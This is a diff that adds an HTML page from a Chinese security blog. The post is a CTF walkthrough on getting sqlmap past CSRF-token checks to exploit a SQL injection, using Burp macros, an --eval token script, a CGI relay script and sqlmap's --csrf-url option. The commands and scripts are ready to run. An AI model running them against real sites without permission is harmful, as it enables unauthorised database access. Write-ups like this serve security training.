@@ -1,0 +1,334 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>sqlmap CSRF-token 绕过姿势 | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="sqlmap CSRF-token 绕过姿势 | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="CSRF(Cross-site request forgery 跨站请求伪造)主流防御方式是在后端生成表单的时候生成一串随机 token ，内置到表单里成为一个字段，同时，将此串 token 置入 session 中。每次表单提交到后端时都..." />
+    <meta name="keywords" content="Summary,SQLi" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              sqlmap CSRF-token 绕过姿势
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-03-25
+              </span>
+              <span>
+                6 min read
+              </span>
+              <span class="page-view" key="20190325002300" title="sqlmap CSRF-token 绕过姿势">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/summary/" class="post-tag">
+                  # Summary
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/sqli/" class="post-tag">
+                  # SQLi
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <p>CSRF(Cross-site request forgery 跨站请求伪造)主流防御方式是在后端生成表单的时候生成一串随机 token ，内置到表单里成为一个字段，同时，将此串 token 置入 session 中。每次表单提交到后端时都会检查这两个值是否一致，以此来判断此次表单提交是否是可信的。提交过一次之后，如果这个页面没有生成 CSRF token ，那么 token 将会被清空，如果有新的需求，那么 token 会被更新。</p>
+<p>当我们在使用sqlmap自动化进行SQL注入时，有些场景下需要解决csrf-token验证问题，本文结合<a href="https://new.bugku.com">CTF_论剑场</a> web8 样例进行演示常见的4种绕过方式:结合BurpSuite宏绕过、eval参数绕过、通过Python CGIHTTPServer绕过以及通过--csrf-url/token参数绕过~</p>
+<p>题目在update.php里<code>age</code>更新处存在<code>数字型SQL注入</code>，每次提交更新需要验证<code>token</code>值，不符合则会触发<strong>CSRF token mismatch</strong>，这里的token为前端赋值~</p>
+<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552118730410-ae528994-5ea0-4de2-b3fb-3c6b4f2e4c67.png" alt="" loading="lazy"></figure>
+<h2 id="burpsuite-macros">BurpSuite Macros</h2>
+<p>我们可以利用BurpSuite Macros录制token，获取前一次HTTP请求响应的token值，作为后续请求的输入参数，从而绕过csrf-token验证。</p>
+<p><code>Project Opition</code>-&gt;<code>Session</code>-&gt;<code>Macros</code>，点击<code>Add</code>添加宏:</p>
+<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552120384862-ea454f45-a63b-4c10-a8bd-b2889bb6091c.png" alt="" loading="lazy"></figure>
+<p>在<code>Macro Recorder</code>中选择获取token的页面后确定。</p>
+<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552120713208-028ed873-9fcc-4889-9877-61b093cdac09.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552121005246-d68403d7-99ff-4054-a113-010afa47a13d.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552121156506-ef1aafd9-65ea-4d9d-829c-61adccc8024c.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552121640868-3b2dae6d-5bec-4af7-97cf-c3b7e642df98.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552121984945-835d9f76-3e05-44df-ad9c-735850e98d74.png" alt="" loading="lazy"></figure>
+<p>添加规则生效的模块以及获取token界面的URL地址。</p>
+<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552122423697-80e8dcd4-5c16-40fc-aa95-c6b837e7fecb.png" alt="" loading="lazy"></figure>
+<p>检测是否正确工作，使用sqlmap经过burpsuite进行注入，成功绕过csrf-token~</p>
+<pre><code class="language-bash">sqlmap -r C:\Users\light\Desktop\post.txt --proxy=http://127.0.0.1:8080 --dbs -v 3
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552123107426-1234cd74-3080-4663-921b-d27520b45e8d.png" alt="" loading="lazy"></figure>
+<h2 id="eval参数">eval参数</h2>
+<pre><code class="language-s"># sqlmap手册
+--eval=EVALCODE  Evaluate provided Python code before the request 
+# e.g. 每次请求时根据id参数值，做一次md5后作为hash参数的值。
+&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;
+</code></pre>
+<p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。</p>
+<p>这里我们可以写一个脚本来获取页面csrf-token的值,通过sqlmap --eval参数将获取的token加入数据包后再发送请求进行测试，从而绕过csrf-token验证。</p>
+<p>getToken脚本:</p>
+<pre><code class="language-python">import urllib2
+import re
+
+
+def get_token():
+    # Load a page to generate a CSRF token
+    opener = urllib2.build_opener()
+    opener.addheaders.append(('Cookie', 'PHPSESSID=&lt;insert PHPSESSID&gt;'))
+    page = opener.open('http://&lt;insert url&gt;/index.php').read()
+    # Extract the token
+    match = re.search(r'&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;(.+)&quot;&gt;', page)
+    return match.group(1)
+</code></pre>
+<p>执行命令验证：</p>
+<pre><code class="language-bash">python2 sqlmap.py -r C:\Users\light\Desktop\post.txt --eval=&quot;import getToken; token = getToken.get_token()&quot; -v 3 -p &quot;age&quot; --current-db
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552148260954-ff0d7e2e-9d4b-4831-af17-fe62d6a8af4a.png" alt="" loading="lazy"></figure>
+<p>成功绕过，但受python脚本运行影响效率较低~</p>
+<h2 id="python-cgihttpserver">Python CGIHTTPServer</h2>
+<p>CGI(Common Gateway Interface)是服务器和应用脚本之间的一套接口标准。它的功能是让服务器程序运行脚本程序，将程序的输出作为response发送给客户。总体的效果，是允许服务器动态的生成回复内容，而不必局限于静态文件。</p>
+<p>支持CGI的服务器程接收到客户的请求，根据请求中的URL，运行对应的脚本文件。服务器会将HTTP请求的信息和socket信息传递给脚本文件，并等待脚本的输出。脚本的输出封装成合法的HTTP回复，发送给客户。CGI可以充分发挥服务器的可编程性，让服务器变得“更聪明”。</p>
+<p>现在我们通过CGIHTTPServer即可在本地tcp端口监听,动态修改数据包，无需配置和刻意提交token,即可使用sqlmap检测sql注入。</p>
+<p>创建CGI脚本如下:</p>
+<pre><code class="language-python">import cgi,cgitb
+from mechanize import Browser
+cgitb.enable() #允许发生错误时浏览器打印通知
+
+url = &quot;http://your-url/index.php&quot;
+
+def respond(string):
+    print(&quot;Content-Type: text/html&quot;)
+    print()
+    print(string)
+    quit()
+
+form = cgi.FieldStorage()
+u = form[&quot;username&quot;].value
+p = form[&quot;password&quot;].value
+
+b = Browser()
+b.set_handle_robots(False)
+b.open(url)
+b.select_form(nr=0)
+b.form[&quot;username&quot;] = u
+b.form[&quot;password&quot;] = p
+b.submit()
+respond(b.title())
+</code></pre>
+<p>目录结构:</p>
+<pre><code class="language-bash">csrf-token # 自定义
+└─cgi-bin # 设置为cgi-bin
+    └─token.py # 自定义脚本名称
+</code></pre>
+<p>Python3下执行命令:<code>python -m http.server --cgi 8000</code>开启CGIHTTPServer.</p>
+<p>浏览器访问:http://127.0.0.1:8000/cgi-bin/token.py?username=x3nd&amp;password=x3nd.</p>
+<figure data-type="image" tabindex="11"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552129345855-41183c20-05af-4bce-a6dc-8fe91180ed78.png" alt="" loading="lazy"></figure>
+<p>打印了成功登陆后的页面标题，表明登陆成功，现在我们可以直接运行sqlmap尽情测试了。</p>
+<pre><code class="language-bash">sqlmap -r C:\Users\light\Desktop\post.txt --current-db
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552184470820-e0c4692b-c7c0-411e-88e0-13420c19af84.png" alt="" loading="lazy"></figure>
+<h2 id="-csrf-urltoken">--csrf-url/token</h2>
+<p>在sqlmap usage里 Requests模块中描述：</p>
+<pre><code class="language-bash"># --csrf-token 用于保存反CSRF令牌的参数
+--csrf-token=CSR..  Parameter used to hold anti-CSRF token
+# --csrf-url 用于提取反CSRF令牌的URL地址
+--csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token
+</code></pre>
+<blockquote>
+<p><a href="https://github.com/sqlmapproject/sqlmap/issues/2">Implement anti-CSRF protection bypass</a></p>
+</blockquote>
+<p>sqlmap在注入过程中对于一些易识别的参数关键字如&quot;token&quot;、&quot;nonce&quot;进行了识别，会询问是否进行anti-CSRF操作，但默认获取csrf的地址为数据包中的地址，如本题目中的<code>update.php</code>，而<code>token</code>的获取在这里应该是<code>index.php</code>界面，这时就需要我们分析并指定--csrf-token以及--csrf-url方便sqlmap进行anti-CSRF。</p>
+<pre><code class="language-bash">sqlmap -r C:\Users\light\Desktop\post.txt --csrf-url=&quot;http://123.xxx.xxx.85:10008/index.php&quot; --csrf-token=token --dbs
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1552185625050-5eb57679-0fa8-4fec-ab89-48d0af4fb47b.png" alt="" loading="lazy"></figure>
+<p>sqlmap+BurpSuite Macros绕过csrf-token繁琐在csrf-token宏的会话录制处理，--eval参数配置脚本则需要我们自写获取token的python脚本且运行效率较慢，通过类似中间层作用的Python CGIHTTPServer绕过时，可以在使用sqlmap或burpsuite等工具测试时不需要进行额外的操作，sqlmap官方提供的anti-CSRF策略(--csrf-url/token)不失为一种方便操作的办法。</p>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#burpsuite-macros">BurpSuite Macros</a></li>
+<li><a href="#eval%E5%8F%82%E6%95%B0">eval参数</a></li>
+<li><a href="#python-cgihttpserver">Python CGIHTTPServer</a></li>
+<li><a href="#-csrf-urltoken">--csrf-url/token</a></li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-SQLi-labs-Basic-Challenges-Less-1-22/">
+                <h3 class="post-title" style="text-align: left;">
+                  SQLi-labs Basic Challenges
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-3-21-ctf-web-common/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  CTF 中常见的 Web 解题思路
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
